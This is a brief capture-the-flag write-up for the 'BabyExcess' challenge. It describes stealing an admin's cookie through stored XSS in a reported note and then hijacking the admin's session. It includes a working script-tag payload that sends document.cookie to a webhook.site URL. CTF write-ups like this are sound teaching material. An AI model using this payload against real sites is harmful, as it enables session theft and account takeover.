# BabyExcess

## Short Writeup

1. Create xss payload using script tag
2. Go to webhook.site and a get the randomly generated url
3. paste that url in the payload 
4. create a note using that payload
5. report that note to the admin
6. we will get the admin cookie in the webhook.site page
7. using developer tools we can edit the cookie on the challenge site and put admin's cookie 
7. After editing the cookie, refresh the page , then  we will be logged in  as admin thus we will the flag.

```html
<script>window.location.href=`https://webhook.site/ff27a242-3497-4002-af66-f4a5a7b70ed2/${document.cookie}`</script>
```

